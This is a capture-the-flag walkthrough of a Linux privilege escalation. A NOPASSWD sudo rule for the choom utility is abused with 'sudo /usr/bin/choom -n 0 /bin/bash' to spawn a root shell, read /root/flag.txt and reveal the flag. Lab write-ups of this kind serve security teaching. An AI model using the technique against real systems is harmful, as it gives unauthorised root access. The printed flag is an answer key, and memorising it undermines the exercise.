
## Goal is to escalate privileges to root and retrieve the /root/flag.txt file contents using a misconfigured sudo permission.

In this task, the initial enumeration with sudo -l revealed an interesting vector: the user can run /usr/bin/choom as root without providing a password (NOPASSWD).

```shell
user@f8b9a81ceff046b4a38db74880ec16c7-2377118072:~$ sudo -l
Matching Defaults entries for user on f8b9a81ceff046b4a38db74880ec16c7-2377118072:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on f8b9a81ceff046b4a38db74880ec16c7-2377118072:
    (ALL) NOPASSWD: /usr/bin/choom
```


> choom is a standard Linux utility used to display or adjust the Out-Of-Memory (OOM) killer score for processes. Looking at its help menu options, it contains a specific syntax pattern that allows executing an arbitrary command directly after adjusting the score:

```Plaintext

choom [options] -n number command [args...]
```


Because choom runs with root privileges via sudo, any child process it spawns inherits those same root privileges. By passing an interactive shell as the command argument, we can break out of our restricted user environment.

To spawn a root shell, we execute choom with an arbitrary score adjustment (-n 0) and pass /bin/bash as our target command:

Bash

```bash
user@f8b9a81ceff046b4a38db74880ec16c7-2377118072:~$ sudo /usr/bin/choom -n 0 /bin/bash
root@f8b9a81ceff046b4a38db74880ec16c7-2377118072:/home/user#
```


This drops us directly into a root shell interface. From there, we navigate to the root home directory and read the target flag file:
Bash

```bash
root@f8b9a81ceff046b4a38db74880ec16c7-2377118072:~# ls
flag.txt
root@f8b9a81ceff046b4a38db74880ec16c7-2377118072:~# cat flag.txt
cac96cbf03c8690df8d97e34be194cf1root@f8b9a81ceff046b4a38db74880ec16c7-2377118072:~#
```


FLAG: cac96cbf03c8690df8d97e34be194cf1
